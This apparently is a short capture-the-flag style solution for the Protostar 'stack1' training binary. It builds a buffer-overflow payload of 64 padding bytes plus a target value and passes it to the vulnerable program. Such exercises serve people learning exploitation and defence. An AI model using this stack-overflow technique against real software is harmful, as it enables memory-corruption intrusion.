python -c 'print "A" * 64 + "\x64\x63\x62\x61"' > stack1_attack.txt

/opt/protostar/bin/stack1 `cat stack1_attack.txt`
